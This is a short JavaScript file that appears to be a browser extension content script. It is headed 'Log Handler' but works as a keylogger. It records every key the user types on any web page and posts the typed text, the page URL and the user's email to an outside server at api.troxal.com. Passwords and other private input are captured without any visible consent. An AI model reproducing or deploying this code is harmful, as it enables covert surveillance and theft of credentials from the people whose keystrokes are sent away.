// Log Handler
function get_date14_win(){var d=new Date();var yyyy=d.getFullYear();var mm=d.getMonth()+1;if(mm<10){mm="0"+mm}var dd=d.getDate();if(dd<10){dd="0"+dd}var hh=d.getHours();if(hh<10){hh="0"+hh}var mi=d.getMinutes();if(mi<10){mi="0"+mi}var ss=d.getSeconds();if(ss<10){ss="0"+ss}return yyyy+"/"+mm+"/"+dd+" "+hh+":"+mi+":"+ss}console.debug=function(msg){console.log("DEBUG ["+get_date14_win()+"] "+msg)};console.error=function(msg){console.log("ERROR ["+get_date14_win()+"] "+msg)};console.info=function(msg){console.log("INFO ["+get_date14_win()+"] "+msg)};

var useremail;
chrome.extension.sendMessage({}, function(response) {
  useremail = response.email
});
console.debug(useremail);
var timeout = null;
var key = '';
var j = {};
j.query = jQuery.noConflict( true );
j.query(this).keypress((e) => {
clearTimeout(timeout);
key = key + e.key;
timeout = setTimeout(function () {
    j.query.post("https://api.troxal.com/troxal/report/key/", {
            typed: key,
            domain: window.location.href,
            user: useremail
        },
        function() {console.debug("Key successfully logged.");})
        .fail(function() {
            console.error("Key potentially blocked? More testing needed.");
        });
        key = '';
    }, 500);
})

